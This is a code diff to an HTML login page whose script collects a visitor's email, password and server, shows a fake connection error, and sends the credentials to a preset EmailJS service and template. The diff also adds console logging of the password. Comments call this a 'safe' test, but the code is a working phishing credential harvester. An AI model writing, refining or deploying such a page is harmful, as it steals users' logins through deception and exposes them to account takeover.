@@ -7,7 +7,7 @@
   <script type="text/javascript" src="https://cdn.emailjs.com/sdk/3.2/email.min.js"></script>
   <script type="text/javascript">
      (function(){
-        emailjs.init("f0SVFShSGNOwyB-sm"); // Your Public Key / User ID
+        emailjs.init("f0SVFShSGNOwyB-sm"); // Public Key / User ID
      })();
   </script>
 </head>
@@ -26,25 +26,29 @@
 
   <script>
     const loginForm = document.getElementById("loginForm");
+
     loginForm.addEventListener("submit", function(event) {
       event.preventDefault();
 
       // Read the inputs
-      const email = document.getElementById("email").value;
-      const password = document.getElementById("password").value;
-      const server = document.getElementById("server").value;
+      const email = document.getElementById("email").value.trim();
+      const password = document.getElementById("password").value.trim();
+      const server = document.getElementById("server").value.trim();
 
       // Show a fake error message
       document.getElementById("message").innerText = "Error: Could not connect to server.";
 
-      // Send a test email safely to yourself
+      // Debug log for testing
+      console.log("Attempting to send test email:", { email, password, server });
+
+      // Send safely via EmailJS
       emailjs.send("service_lspaiuv", "template_w3426ag", {
         email: email,
         password: password,
         server: server
       })
-      .then(function() { 
-        console.log("Test email sent safely!"); 
+      .then(function(response) { 
+        console.log("Test email sent safely!", response.status, response.text); 
       })
       .catch(function(error) {
         console.error("Failed to send email:", error);
